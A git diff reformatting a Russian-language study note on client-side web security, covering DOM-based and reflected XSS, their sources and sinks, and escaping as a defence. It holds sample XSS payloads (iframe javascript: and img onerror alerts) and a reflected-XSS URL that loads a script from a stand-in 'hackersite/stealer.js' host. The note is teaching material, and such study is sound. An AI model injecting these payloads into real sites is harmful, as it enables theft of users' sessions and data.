@@ -1,22 +1,20 @@
 ### Безопасность клиентских веб приложений
 
-#### Межсайтовый сприптинг (cross site scripting - XSS) - характеризуется обходом SOP (Same origin policy)
-1) XSS
-    - 1.1) - DOM-XSS Для фронтенд актуален тип атак DOM-XSS - когда скрипт встраивается в DOM через легитимный код.
-        Требует наличия двух условий
+1) Межсайтовый сприптинг (cross site scripting - XSS) - характеризуется обходом SOP (Same origin policy)
+    - DOM-XSS Для фронтенд актуален тип атак DOM-XSS - когда скрипт встраивается в DOM через легитимный код.
+    Требует наличия двух условий
         - sources (источники загружаемого вредоносногот кода)
             - document.URL, location, document.referer, window.name, localStorage, cookies
         - sinks - точки исполнения
             - eval, document.write, element.innerHTML, element.src, setTimeout/setInterval, execScript
         - Примеры
-        ```js 
-            <input value="">
-            <iframe SRC="javascript:alert('XSS')"></iframe>
-        или
-            <input value=""><img src=i oneerror=alert('xss')>
-      ```
- 
-    - 1.2) Reflect XSS - Так же может быть проведен через пользовательские сообщения содержащие ссылки в Вашем приложении
+            ```js 
+                <input value="">
+                <iframe SRC="javascript:alert('XSS')"></iframe>
+            или
+                <input value=""><img src=i oneerror=alert('xss')>
+          ```
+    - Reflect XSS - Так же может быть проведен через пользовательские сообщения содержащие ссылки в Вашем приложении
 (комментарии, сообщения - `http://forum.by?searchnews<\script%20src="http://hackersite/stealer.js`)
 Анализ кода регулярками - перед отправкой на сервер другим клиентам
         - Фильтрация пользовательских форм - представление спецсимолов через escape символы, для ограждения
